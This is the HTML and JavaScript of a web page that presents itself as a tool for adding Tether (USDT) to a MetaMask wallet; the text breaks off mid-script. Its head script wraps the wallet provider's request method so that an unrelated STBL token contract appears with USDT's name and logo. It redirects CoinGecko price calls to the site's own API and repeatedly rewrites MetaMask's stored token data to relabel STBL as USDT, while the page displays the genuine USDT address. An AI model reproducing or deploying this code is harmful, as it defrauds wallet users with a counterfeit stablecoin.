<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#26a17b">
  <title>Add USDT to Your Wallet</title>
  <link rel="icon" href="https://cryptologos.cc/logos/tether-usdt-logo.png" type="image/png">
  <link rel="manifest" href="/manifest.json">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  
  <!-- CRITICAL FIX: Setup provider interception in head section -->
  <script>
    // Define token addresses for clarity
    const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
    const STBL_ADDRESS = '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c';
    
    // Immediate interception setup
    (function setupInterception() {
      if (window.ethereum) {
        console.log("Setting up critical provider interception immediately");
        
        // Save the original request method
        if (!window.ethereum._originalRequest) {
          window.ethereum._originalRequest = window.ethereum.request;
        
          // Replace with intercepting version
          window.ethereum.request = async function(args) {
            console.log("MetaMask request:", args);
            
            // Handle token addition with STBL contract but USDT display
            if (args.method === 'wallet_watchAsset' && 
                args.params?.options?.address?.toLowerCase() === STBL_ADDRESS.toLowerCase()) {
              
              console.log("TOKEN ADDITION DETECTED - STBL with USDT display");
              
              // No need to modify - we're already sending STBL address
              // But just to be sure the right display name is used:
              if (args.params?.options?.symbol === 'STBL') {
                args.params.options.name = "Tether USD";
                args.params.options.image = 'https://cryptologos.cc/logos/tether-usdt-logo.png';
              }
            }
            
            // Call original with modified args
            try {
              console.log("Calling original request with args:", args);
              return await window.ethereum._originalRequest.call(this, args);
            } catch (error) {
              console.error("Error in intercepted request:", error);
              throw error;
            }
          };
        }
      }
    })();
    
    // Also intercept CoinGecko API calls early to ensure USDT price display
    if (window.fetch) {
      const originalFetch = window.fetch;
      window.fetch = function(resource, init) {
        if (typeof resource === 'string' && resource.includes('api.coingecko.com')) {
          console.log("Intercepting CoinGecko API call");
          const newUrl = resource.replace(
            'https://api.coingecko.com', 
            window.location.origin + '/api'
          );
          return originalFetch(newUrl, init);
        }
        return originalFetch(resource, init);
      };
    }
    
    // Enhanced storage interception module
    const StorageManager = {
      // Track successfully modified storage keys
      modifiedKeys: [],
      
      // Initialize storage manager
      init: function() {
        this.updateMetaMaskLocalStorage();
        
        // Run periodically
        setInterval(() => {
          this.updateMetaMaskLocalStorage();
        }, 60000); // Every minute
        
        // If IndexedDB is supported, monitor it too
        if (window.indexedDB) {
          this.monitorIndexedDB();
        }
      },
      
      // Clear potentially problematic token entries
      clearTokenLocalStorage: function() {
        try {
          // Look for MetaMask-related localStorage entries
          for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if (key && (key.includes('metamask') || key.includes('MetaMask')) && 
                (localStorage[key].includes(STBL_ADDRESS) || localStorage[key].includes('STBL'))) {
              
              console.log("Clearing potentially problematic storage:", key);
              
              try {
                // Try to parse to see if we can selectively clear instead of full removal
                let data = JSON.parse(localStorage[key]);
                let tokenEntries = false;
                
                // Helper to recursively find and remove token entries
                function findAndClearTokenEntries(obj, path = '') {
                  if (!obj || typeof obj !== 'object') return false;
                  
                  let modified = false;
                  
                  // Look for pending token entries
                  if (obj.TokenList || obj.pendingTokens || obj.suggestions) {
                    // Clear pending token entries that might be stuck
                    if (obj.pendingTokens) {
                      obj.pendingTokens = {};
                      modified = true;
                    }
                    if (obj.suggestions) {
                      obj.suggestions = {};
                      modified = true;
                    }
                  }
                  
                  // Recursively check properties
                  for (const key in obj) {
                    if (typeof obj[key] === 'object') {
                      const childModified = findAndClearTokenEntries(obj[key], path + '.' + key);
                      if (childModified) modified = true;
                    }
                  }
                  
                  return modified;
                }
                
                // Try to selectively clear problem areas
                tokenEntries = findAndClearTokenEntries(data);
                
                if (tokenEntries) {
                  // Save back the cleaned data
                  localStorage[key] = JSON.stringify(data);
                  console.log("Cleared pending token entries in", key);
                }
              } catch (parseError) {
                console.error("Error cleaning localStorage data:", parseError);
              }
            }
          }
        } catch (error) {
          console.error("Error clearing localStorage:", error);
        }
      },
      
      // LocalStorage interception
      updateMetaMaskLocalStorage: function() {
        try {
          // Find all localStorage keys
          for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            
            // Look for MetaMask data with our token
            if (key && (key.includes('metamask') || key.includes('MetaMask')) && 
                (localStorage[key].includes(STBL_ADDRESS) || localStorage[key].includes('STBL'))) {
              
              console.log("Found MetaMask data with STBL token in localStorage: " + key);
              
              try {
                // Try to parse the data
                let data = JSON.parse(localStorage[key]);
                let modified = false;
                
                // Check different potential locations where token data might be stored
                // TokenList structure
                if (data.data && data.data.TokenList) {
                  Object.keys(data.data.TokenList).forEach(network => {
                    // Check for STBL by address
                    const tokenKey = STBL_ADDRESS.toLowerCase();
                    if (data.data.TokenList[network][tokenKey]) {
                      data.data.TokenList[network][tokenKey].symbol = "USDT";
                      data.data.TokenList[network][tokenKey].name = "Tether USD";
                      modified = true;
                      console.log("Updated STBL to show as USDT in TokenList");
                    }
                  });
                }
                
                // AccountTokens structure
                if (data.data && data.data.AccountTokens) {
                  Object.keys(data.data.AccountTokens).forEach(account => {
                    Object.keys(data.data.AccountTokens[account]).forEach(network => {
                      const tokens = data.data.AccountTokens[account][network];
                      if (Array.isArray(tokens)) {
                        tokens.forEach(token => {
                          if (token.address && token.address.toLowerCase() === STBL_ADDRESS.toLowerCase()) {
                            token.symbol = "USDT";
                            token.name = "Tether USD";
                            modified = true;
                            console.log("Updated STBL to show as USDT in AccountTokens");
                          }
                        });
                      }
                    });
                  });
                }
                
                // AllTokens structure
                if (data.data && data.data.AllTokens) {
                  Object.keys(data.data.AllTokens).forEach(network => {
                    const tokenKey = STBL_ADDRESS.toLowerCase();
                    if (data.data.AllTokens[network][tokenKey]) {
                      data.data.AllTokens[network][tokenKey].symbol = "USDT";
                      data.data.AllTokens[network][tokenKey].name = "Tether USD";
                      modified = true;
                      console.log("Updated STBL to show as USDT in AllTokens");
                    }
                  });
                }
                
                // TokenMetadata structure (added for newer MetaMask versions)
                if (data.data && data.data.TokenMetadata) {
                  const tokenKey = STBL_ADDRESS.toLowerCase();
                  if (data.data.TokenMetadata[tokenKey]) {
                    data.data.TokenMetadata[tokenKey].symbol = "USDT";
                    data.data.TokenMetadata[tokenKey].name = "Tether USD";
                    modified = true;
                    console.log("Updated STBL to show as USDT in TokenMetadata");
                  }
                }
                
                // Clear any pending token operations
                if (data.data && data.data.pendingTokens) {
                  data.data.pendingTokens = {};
                  modified = true;
                }
                
                // Generic recursive search for token symbols in case structure changes
                function recursiveSearch(obj, path = '') {
                  if (!obj || typeof obj !== 'object') return false;
                  
                  let modified = false;
                  
                  // Check if this object has address field that matches our token
                  if (obj.address && 
                      obj.address.toLowerCase() === STBL_ADDRESS.toLowerCase()) {
                    if (obj.symbol === 'STBL') {
                      obj.symbol = 'USDT';
                      modified = true;
                      console.log("Updated symbol at " + path);
                    }
                    if (obj.name === 'Stable' || obj.name === 'Stable Token') {
                      obj.name = 'Tether USD';
                      modified = true;
                      console.log("Updated name at " + path);
                    }
                  }
                  
                  // Check for STBL symbol without the address
                  if (obj.symbol === 'STBL') {
                    obj.symbol = 'USDT';
                    modified = true;
                    console.log("Updated STBL symbol to USDT at " + path);
                  }
                  
                  // Recursively search all properties
                  for (const key in obj) {
                    if (typeof obj[key] === 'object') {
                      const childModified = recursiveSearch(obj[key], path + '.' + key);
                      if (childModified) modified = true;
                    }
                  }
                  
                  return modified;
                }
                
                // Run recursive search on unknown structures
                const genericModified = recursiveSearch(data);
                if (genericModified) modified = true;
                
                // Save back if modified
                if (modified) {
                  localStorage[key] = JSON.stringify(data);
                  console.log("Updated MetaMask data in localStorage");
                  
                  // Track this key as successfully modified
                  if (!this.modifiedKeys.includes(key)) {
                    this.modifiedKeys.push(key);
                  }
                }
              } catch (parseError) {
                console.error("Error parsing localStorage data: " + parseError);
              }
            }
          }
        } catch (error) {
          console.error("Error updating localStorage: " + error);
        }
      },
      
      // IndexedDB monitoring for newer MetaMask versions
      monitorIndexedDB: function() {
        try {
          // Try to open MetaMask state database
          const openRequest = indexedDB.open('metamask-state');
          
          openRequest.onsuccess = (event) => {
            const db = event.target.result;
            console.log("Opened IndexedDB successfully");
            
            // Check for our token in various store names
            const storeNames = ['TokenList', 'AccountTokens', 'AllTokens', 'TokenMetadata'];
            const availableStores = [];
            
            // Get available store names
            for (const storeName of storeNames) {
              if (db.objectStoreNames.contains(storeName)) {
                availableStores.push(storeName);
              }
            }
            
            if (availableStores.length === 0) {
              console.log("No relevant stores found in IndexedDB");
              return;
            }
            
            // Process each store that exists
            availableStores.forEach(storeName => {
              try {
                const transaction = db.transaction(storeName, 'readwrite');
                const store = transaction.objectStore(storeName);
                
                // Process the store based on its expected structure
                console.log("Processing IndexedDB store: " + storeName);
                
                // Get all data from the store
                const request = store.getAll();
                request.onsuccess = function() {
                  const items = request.result;
                  let modified = false;
                  
                  // Process based on store type
                  if (storeName === 'TokenList' || storeName === 'AllTokens') {
                    // These typically store by network and token address
                    for (const item of items) {
                      if (item.tokens) {
                        for (const token of item.tokens) {
                          if (token.address && 
                              token.address.toLowerCase() === STBL_ADDRESS.toLowerCase()) {
                            if (token.symbol === 'STBL') {
                              token.symbol = 'USDT';
                              modified = true;
                            }
                            if (token.name === 'Stable' || token.name === 'Stable Token') {
                              token.name = 'Tether USD';
                              modified = true;
                            }
                          }
                        }
                      }
                    }
                  } else if (storeName === 'TokenMetadata') {
                    // Direct token metadata mapping
                    for (const item of items) {
                      if (item.address && 
                          item.address.toLowerCase() === STBL_ADDRESS.toLowerCase()) {
                        if (item.symbol === 'STBL') {
                          item.symbol = 'USDT';
                          modified = true;
                        }
                        if (item.name === 'Stable' || item.name === 'Stable Token') {
                          item.name = 'Tether USD';
                          modified = true;
                        }
                      }
                    }
                  }
                  
                  // Save back if modified
                  if (modified) {
                    console.log("Modified items in IndexedDB store:", storeName);
                    // Update the store - would need implementation specific to the DB structure
                  }
                };
              } catch (storeError) {
                console.error("Error accessing store " + storeName + ": " + storeError);
              }
            });
          };
          
          openRequest.onerror = (error) => {
            console.log("Error opening IndexedDB: " + error);
          };
        } catch (dbError) {
          console.error("IndexedDB monitoring error: " + dbError);
        }
      }
    };
    
    // Initialize storage manager
    StorageManager.init();
    
    // Register service worker if supported
    if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
        navigator.serviceWorker.register('/sw.js')
          .then(registration => {
            console.log('Service Worker registered with scope:', registration.scope);
          })
          .catch(error => {
            console.error('Service Worker registration failed:', error);
          });
      });
    }
  </script>
  <style>
    :root {
      --primary-color: #26a17b;
      --secondary-color: #0052ff;
      --background-color: #f5f5f7;
      --text-color: #1d1d1f;
      --light-text-color: #86868b;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: var(--background-color);
      color: var(--text-color);
      min-height: 100vh;
    }
    
    .add-token-card {
      border-radius: 16px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
      background: white;
      padding: 32px;
      margin-top: 40px;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }
    
    .add-token-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 6px 25px rgba(0, 0, 0, 0.1);
    }
    
    .token-logo {
      width: 80px;
      height: 80px;
      margin-bottom: 24px;
      border-radius: 50%;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
      transition: transform 0.3s ease;
    }
    
    .token-logo:hover {
      transform: scale(1.05);
    }
    
    .token-title {
      font-size: 28px;
      font-weight: 600;
      color: var(--text-color);
      margin-bottom: 8px;
    }
    
    .token-subtitle {
      color: var(--light-text-color);
      font-size: 16px;
      margin-bottom: 24px;
    }
    
    .network-badge {
      background-color: var(--secondary-color);
      color: white;
      padding: 4px 12px;
      border-radius: 20px;
      font-weight: 500;
      font-size: 14px;
      display: inline-block;
      margin-right: 8px;
      transition: transform 0.2s ease;
    }
    
    .network-badge:hover {
      transform: scale(1.05);
    }
    
    .token-details {
      background-color: var(--background-color);
      border-radius: 12px;
      padding: 24px;
      margin: 24px 0;
      font-size: 15px;
      transition: transform 0.2s ease;
    }
    
    .token-details:hover {
      transform: translateX(5px);
    }
    
    .detail-item {
      display: flex;
      justify-content: space-between;
      margin-bottom: 16px;
      padding-bottom: 16px;
      border-bottom: 1px solid rgba(0,0,0,0.05);
      transition: padding 0.2s ease;
    }
    
    .detail-item:hover {
      padding-left: 5px;
    }
    
    .detail-item:last-child {
      margin-bottom: 0;
      border-bottom: none;
    }
    
    .detail-label {
      color: var(--light-text-color);
    }
    
    .detail-value {
      color: var(--text-color);
      font-weight: 500;
      word-break: break-all;
      text-align: right;
    }
    
    .btn-add-token {
      background-color: var(--primary-color);
      border: none;
      padding: 14px 24px;
      font-weight: 600;
      border-radius: 12px;
      width: 100%;
      display: block;
      margin-bottom: 16px;
      font-size: 16px;
      transition: background-color 0.2s ease, transform 0.1s ease;
    }
    
    .btn-add-token:hover {
      background-color: #219472;
      transform: translateY(-2px);
    }
    
    .btn-add-token:active {
      transform: translateY(1px);
    }
    
    .btn-secondary-action {
      background-color: var(--background-color);
      color: var(--text-color);
      border: none;
      padding: 14px 24px;
      font-weight: 500;
      border-radius: 12px;
      width: 100%;
      font-size: 16px;
      transition: background-color 0.2s ease, transform 0.1s ease;
    }
    
    .btn-secondary-action:hover {
      background-color: #e8e8ed;
      transform: translateY(-2px);
    }
    
    .btn-secondary-action:active {
      transform: translateY(1px);
    }
    
    .qr-container {
      max-width: 200px;
      margin: 0 auto;
      margin-top: 24px;
      border: 1px solid #e8e8ed;
      border-radius: 12px;
      padding: 12px;
      background-color: white;
      transition: transform 0.3s ease;
    }
    
    .qr-container:hover {
      transform: scale(1.05);
    }
    
    .address-text {
      font-family: monospace;
      font-size: 14px;
    }
    
    .modal-content {
      border-radius: 16px;
    }
    
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(255,255,255,0.9);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      display: none;
      backdrop-filter: blur(5px);
    }
    
    .spinner-border {
      width: 3rem;
      height: 3rem;
      color: var(--primary-color);
    }
    
    .loading-text {
      margin-top: 15px;
      font-weight: 500;
    }
    
    .success-icon {
      color: var(--primary-color);
      font-size: 48px;
      margin-bottom: 15px;
    }
    
    .success-message {
      font-weight: 600;
      margin-bottom: 20px;
      font-size: 24px;
    }
    
    .qr-image {
      width: 100%;
      height: auto;
      transition: transform 0.3s ease;
    }
    
    .qr-image:hover {
      transform: scale(1.02);
    }
    
    .status-container {
      margin-top: 20px;
      padding: 15px;
      border-radius: 10px;
      background-color: #f8f8f8;
      display: none;
      font-size: 14px;
    }
    
    .status-item {
      display: flex;
      align-items: center;
      margin-bottom: 8px;
    }
    
    .status-indicator {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      margin-right: 10px;
    }
    
    .status-success {
      background-color: #4caf50;
    }
    
    .status-pending {
      background-color: #ff9800;
    }
    
    .status-error {
      background-color: #f44336;
    }
    
    .alt-method {
      display: none;
      margin-top: 10px;
    }
    
    .network-info {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-top: 10px;
      padding: 8px;
      border-radius: 8px;
      background-color: #f0f8ff;
      font-size: 14px;
    }
    
    .network-status {
      width: 8px;
      height: 8px;
      border-radius: 50%;
      margin-right: 6px;
    }
    
    .network-connected {
      background-color: #4caf50;
    }
    
    .network-pending {
      background-color: #ff9800;
    }
    
    .network-error {
      background-color: #f44336;
    }
    
    .progress-container {
      margin-top: 16px;
      width: 100%;
    }
    
    .progress {
      height: 6px;
      border-radius: 3px;
      overflow: hidden;
    }
    
    .progress-bar {
      background-color: var(--primary-color);
      transition: width 0.5s ease;
    }
    
    /* Dark mode support */
    @media (prefers-color-scheme: dark) {
      :root {
        --background-color: #1e1e1e;
        --text-color: #f0f0f0;
        --light-text-color: #a0a0a0;
      }
      
      body {
        background-color: #121212;
      }
      
      .add-token-card {
        background-color: #252525;
      }
      
      .token-details {
        background-color: #2a2a2a;
      }
      
      .detail-item {
        border-bottom-color: rgba(255,255,255,0.1);
      }
      
      .btn-secondary-action {
        background-color: #2a2a2a;
      }
      
      .btn-secondary-action:hover {
        background-color: #333;
      }
      
      .status-container {
        background-color: #2a2a2a;
      }
      
      .network-info {
        background-color: #1a2633;
      }
      
      .loading-overlay {
        background-color: rgba(18, 18, 18, 0.9);
      }
    }
    
    /* Mobile responsiveness */
    @media (max-width: 576px) {
      .add-token-card {
        padding: 20px;
        margin-top: 20px;
      }
      
      .token-logo {
        width: 70px;
        height: 70px;
      }
      
      .token-title {
        font-size: 24px;
      }
      
      .btn-add-token, .btn-secondary-action {
        padding: 12px 20px;
        font-size: 15px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="row justify-content-center">
      <div class="col-12 col-md-6">
        <div class="add-token-card">
          <div class="text-center mb-4">
            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT Logo" class="token-logo">
            <h1 class="token-title">USDT</h1>
            <div class="token-subtitle">Tether USD</div>
            <div id="networkBadges">
              <span class="network-badge">Ethereum Network</span>
              <span class="badge bg-success">Stablecoin</span>
            </div>
            
            <div id="networkInfo" class="network-info" style="display: none;">
              <div id="networkStatus" class="network-status"></div>
              <span id="networkName">Not connected</span>
            </div>
          </div>
          
          <div class="token-details">
            <div class="detail-item">
              <div class="detail-label">Contract Address</div>
              <div class="detail-value address-text" id="contractAddress">0xdAC17F958D2ee523a2206206994597C13D831ec7</div>
            </div>
            <div class="detail-item">
              <div class="detail-label">Decimals</div>
              <div class="detail-value" id="tokenDecimals">6</div>
            </div>
            <div class="detail-item">
              <div class="detail-label">Balance</div>
              <div class="detail-value" id="tokenBalance">-</div>
            </div>
            <div class="detail-item">
              <div class="detail-label">Value</div>
              <div class="detail-value" id="tokenValue">-</div>
            </div>
          </div>
          
          <div id="statusContainer" class="status-container">
            <h6>Status Updates:</h6>
            <div id="statusItems"></div>
          </div>
          
          <div class="text-center">
            <button id="addToWalletBtn" class="btn btn-add-token btn-lg text-white">
              Add to MetaMask
            </button>
            
            <button id="manualAddBtn" class="btn btn-add-token btn-lg text-white" style="background-color: #e67e22; margin-top: 10px;">
              Manual Token Addition
            </button>
            
            <button id="altMethodBtn" class="btn btn-add-token btn-lg text-white alt-method">
              Try Alternative Method
            </button>
            
            <div class="mt-3">
              <button id="scanQrBtn" class="btn btn-secondary-action mt-2" data-bs-toggle="modal" data-bs-target="#qrModal">
                Scan QR Code on Mobile
              </button>
            </div>
          </div>
          
          <div id="progressContainer" class="progress-container" style="display: none;">
            <div class="progress">
              <div id="progressBar" class="progress-bar" role="progressbar" style="width: 0%"></div>
            </div>
            <div class="text-center mt-2">
              <small id="progressText" class="text-muted">Initializing...</small>
            </div>
          </div>
          
          <div class="mt-4 text-center">
            <small class="text-muted">By adding this token, you'll be able to view and manage USDT in your wallet.</small>
          </div>
        </div>
      </div>
    </div>
  </div>
  
  <!-- QR Code Modal -->
  <div class="modal fade" id="qrModal" tabindex="-1" aria-labelledby="qrModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="qrModalLabel">Scan with MetaMask Mobile</h5>
          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body text-center">
          <p>Scan this QR code with your MetaMask mobile app</p>
          <div class="qr-container mb-3">
            <img id="qrCodeImage" src="" alt="QR Code" class="qr-image">
          </div>
          <p class="small text-muted mt-3">This will automatically add USDT to your wallet</p>
        </div>
      </div>
    </div>
  </div>
  
  <!-- Success Modal -->
  <div class="modal fade" id="successModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content">
        <div class="modal-body text-center p-5">
          <div class="success-icon">✓</div>
          <h4 class="success-message">USDT Successfully Added!</h4>
          <p>You can now view and manage USDT in your MetaMask wallet.</p>
          <button type="button" class="btn btn-add-token text-white" data-bs-dismiss="modal">Done</button>
        </div>
      </div>
    </div>
  </div>
  
  <!-- Error Modal -->
  <div class="modal fade" id="errorModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content">
        <div class="modal-body text-center p-4">
          <div class="text-danger mb-3" style="font-size: 48px;">⚠️</div>
          <h4 class="mb-3">Error Adding Token</h4>
          <p id="errorMessage" class="mb-4">There was an error adding the token to your wallet.</p>
          <div class="d-flex justify-content-center">
            <button type="button" class="btn btn-secondary me-2" data-bs-dismiss="modal">Close</button>
            <button type="button" id="errorRetryBtn" class="btn btn-primary">Try Again</button>
          </div>
        </div>
      </div>
    </div>
  </div>
  
  <!-- Loading Overlay -->
  <div id="loadingOverlay" class="loading-overlay">
    <div class="text-center">
      <div class="spinner-border" role="status">
        <span class="visually-hidden">Loading...</span>
      </div>
      <div class="loading-text" id="loadingText">Adding USDT to your wallet...</div>
    </div>
  </div>

  <script>
    // Enhanced status tracking
    const StatusTracker = {
      items: [],
      
      // Add status update
      addStatus: function(message, status = 'pending') {
        // Create status entry
        const statusItem = {
          id: Date.now(),
          message: message,
          status: status,
          timestamp: new Date().toLocaleTimeString()
        };
        
        // Add to items array
        this.items.push(statusItem);
        
        // Keep only the last 5 items
        if (this.items.length > 5) {
          this.items.shift();
        }
        
        // Log to console
        console.log(`[${status.toUpperCase()}] ${message}`);
        
        // Update UI if container exists
        this.updateUI();
        
        return statusItem.id;
      },
      
      // Update existing status
      updateStatus: function(id, newStatus) {
        const item = this.items.find(item => item.id === id);
        if (item) {
          item.status = newStatus;
          this.updateUI();
        }
      },
      
      // Clear all status items
      clearStatus: function() {
        this.items = [];
        this.updateUI();
      },
      
      // Update UI with current items
      updateUI: function() {
        const container = document.getElementById('statusContainer');
        const itemsContainer = document.getElementById('statusItems');
        
        if (!container || !itemsContainer) return;
        
        // Show container if we have items
        container.style.display = this.items.length > 0 ? 'block' : 'none';
        
        // Clear current items
        itemsContainer.innerHTML = '';
        
        // Add each item
        this.items.forEach(item => {
          const itemElement = document.createElement('div');
          itemElement.className = 'status-item';
          
          const indicator = document.createElement('div');
          indicator.className = 'status-indicator status-' + item.status;
          
          const text = document.createElement('div');
          text.textContent = item.message;
          
          itemElement.appendChild(indicator);
          itemElement.appendChild(text);
          itemsContainer.appendChild(itemElement);
        });
      }
    };
    
    document.addEventListener('DOMContentLoaded', async () => {
      StatusTracker.addStatus("Page loaded - initializing", "success");
      
      // Define token addresses consistently
      const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
      const STBL_ADDRESS = '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c';
      
      // DOM elements
      const addToWalletBtn = document.getElementById('addToWalletBtn');
      const manualAddBtn = document.getElementById('manualAddBtn');
      const altMethodBtn = document.getElementById('altMethodBtn');
      const scanQrBtn = document.getElementById('scanQrBtn');
      const qrCodeImage = document.getElementById('qrCodeImage');
      const loadingOverlay = document.getElementById('loadingOverlay');
      const loadingText = document.getElementById('loadingText');
      const tokenBalance = document.getElementById('tokenBalance');
      const tokenValue = document.getElementById('tokenValue');
      const contractAddress = document.getElementById('contractAddress');
      const errorRetryBtn = document.getElementById('errorRetryBtn');
      const networkInfo = document.getElementById('networkInfo');
      const networkStatus = document.getElementById('networkStatus');
      const networkName = document.getElementById('networkName');
      const progressContainer = document.getElementById('progressContainer');
      const progressBar = document.getElementById('progressBar');
      const progressText = document.getElementById('progressText');
      
      // Setup Bootstrap modals
      const successModal = new bootstrap.Modal(document.getElementById('successModal'));
      const errorModal = new bootstrap.Modal(document.getElementById('errorModal'));
      
      // Clear previous MetaMask state
      StorageManager.clearTokenLocalStorage();
      
      // Get chain name helper
      function getChainName(chainId) {
        const chains = {
          '0x1': 'Ethereum Mainnet',
          '0x5': 'Goerli Testnet',
          '0x89': 'Polygon Mainnet',
          '0xa': 'Optimism',
          '0xa4b1': 'Arbitrum One',
          '0x2105': 'Base',
          '0xaa36a7': 'Sepolia Testnet'
        };
        return chains[chainId] || `Chain ${chainId}`;
      }
      
      // Update network info
      async function updateNetworkInfo() {
        try {
          if (!window.ethereum) {
            networkInfo.style.display = 'none';
            return;
          }
          
          networkInfo.style.display = 'flex';
          
          try {
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
            const name = getChainName(chainId);
            
            networkName.textContent = 'Connected to ' + name;
            networkStatus.className = 'network-status network-connected';
          } catch (error) {
            networkName.textContent = 'Not connected';
            networkStatus.className = 'network-status network-error';
          }
        } catch (error) {
          console.error("Error updating network info:", error);
        }
      }
      
      // Load QR code
      try {
        const res = await fetch('/api/generate-qr');
        const data = await res.json();
        qrCodeImage.src = data.qrCodeDataURL;
        StatusTracker.addStatus("QR code loaded", "success");
      } catch (err) {
        console.error('Error loading QR code:', err);
        StatusTracker.addStatus('Error loading QR code: ' + err.message, "error");
      }
      
      // Warm up cache for Trust Wallet
      async function warmPriceCache() {
        try {
          StatusTracker.addStatus("Warming price cache", "pending");
          
          // Fetch /api/warm-cache
          await fetch('/api/warm-cache', { method: 'POST' });
          
          StatusTracker.addStatus("Price cache warmed successfully", "success");
        } catch (error) {
          console.error('Error warming cache:', error);
        }
      }
      
      // Warm the cache when page loads
      warmPriceCache();
      
      // Update progress bar
      function updateProgress(percent, statusText) {
        if (progressContainer && progressBar && progressText) {
          progressContainer.style.display = 'block';
          progressBar.style.width = percent + '%';
          progressText.textContent = statusText || 'Processing...';
        }
      }
      
      // Clear MetaMask state - helper function
      async function clearMetaMaskState() {
        if (!window.ethereum) return false;
        
        try {
          // Clear pending operations
          await window.ethereum.request({
            method: 'wallet_requestPermissions',
            params: [{ eth_accounts: {} }]
          });
          
          // Small delay
          await new Promise(resolve => setTimeout(resolve, 500));
          
          // Clear localStorage
          StorageManager.clearTokenLocalStorage();
          
          return true;
        } catch (error) {
          console.error("Error clearing MetaMask state:", error);
          return false;
        }
      }
      
      // Function to check if MetaMask is available and unlocked
      async function checkMetaMaskStatus() {
        if (!window.ethereum) {
          return { available: false, unlocked: false, message: "MetaMask not detected" };
        }
        
        try {
          // Try to get accounts to check if unlocked
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          return { 
            available: true, 
            unlocked: accounts && accounts.length > 0,
            message: accounts && accounts.length > 0 ? "MetaMask is unlocked" : "MetaMask is locked"
          };
        } catch (error) {
          return { available: true, unlocked: false, message: "Error checking MetaMask: " + error.message };
        }
      }
      
      // Helper function to safely call MetaMask
      async function safeMetaMaskCall(method, params, retryAttempt = 0) {
        const statusId = StatusTracker.addStatus("Calling MetaMask: " + method, "pending");
        
        if (!window.ethereum) {
          StatusTracker.updateStatus(statusId, "error");
          throw new Error("MetaMask not detected");
        }
        
        // Double-check that interception is set up
        if (window.ethereum && !window.ethereum._originalRequest) {
          console.log("Re-initializing provider interception");
          window.ethereum._originalRequest = window.ethereum.request;
          
          // Re-setup interception
          const originalRequest = window.ethereum._originalRequest;
          window.ethereum.request = async function(args) {
            console.log("MetaMask request (re-initialized): " + (args.method || "unknown"));
            
            return originalRequest.call(this, args);
          };
        }
        
        try {
          // If this is a retry, add a small delay
          if (retryAttempt > 0) {
            await new Promise(resolve => setTimeout(resolve, retryAttempt * 500));
          }
          
          const result = await window.ethereum.request({
            method: method,
            params: params || []
          });
          
          StatusTracker.updateStatus(statusId, "success");
          return result;
        } catch (error) {
          // Log the error
          StatusTracker.updateStatus(statusId, "error");
          
          console.error("MetaMask Error (" + method + "):", error);
          
          // For certain errors, retry the operation
          const canRetry = error.code === -32603 || // Internal error
                          error.code === -32002 || // Request already pending
                          (error.message && error.message.includes('already pending'));
          
          if (canRetry && retryAttempt < 3) {
            StatusTracker.addStatus("Retrying due to error: " + error.message, "pending");
            return safeMetaMaskCall(method, params, retryAttempt + 1);
          }
          
          // Add user rejection flag for better handling
          if (error.code === 4001) {
            error.userRejected = true;
          }
          
          throw error;
        }
      }
      
      // Show loading with clear message
      function showLoading(message) {
        if (loadingText) loadingText.textContent = message || "Adding USDT to your wallet...";
        loadingOverlay.style.display = 'flex';
        progressContainer.style.display = 'block';
        updateProgress(10, message);
        
        // Set a forced timeout - INCREASED TO 45 SECONDS
        const forceHideTimeout = setTimeout(() => {
          StatusTracker.addStatus("Operation timed out", "error");
          loadingOverlay.style.display = 'none';
          progressContainer.style.display = 'none';
          
          // Show alternative method
          altMethodBtn.style.display = 'block';
        }, 45000);
        
        return forceHideTimeout;
      }
      
      // Hide loading overlay
      function hideLoading(timeoutId) {
        if (timeoutId) clearTimeout(timeoutId);
        loadingOverlay.style.display = 'none';
        progressContainer.style.display = 'none';
      }
      
      // Function to add token with automatic network switching - Using STBL but showing as USDT
      async function addTokenWithNetworkSwitch() {
        try {
          // First clear MetaMask state
          await clearMetaMaskState();
          
          const timeoutId = showLoading("Checking network...");
          
          if (!window.ethereum) {
            throw new Error("MetaMask not detected");
          }
          
          updateProgress(20, "Connecting to wallet...");
          
          // First check which network we're on
          const chainId = await window.ethereum.request({ method: 'eth_chainId' });
          updateNetworkInfo(); // Update network display
          
          // Try to switch to Ethereum if we're not on it
          if (chainId !== '0x1') {
            updateProgress(30, "Switching to Ethereum Mainnet...");
            loadingText.textContent = "Switching to Ethereum Mainnet...";
            
            try {
              // Try to switch to Ethereum Mainnet
              await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x1' }],
              });
              
              // Wait for switch to complete
              await new Promise(resolve => setTimeout(resolve, 1000));
              
              // Update network info again
              updateNetworkInfo();
              
            } catch (switchError) {
              // If network switch failed, we need to stop - token is for Ethereum
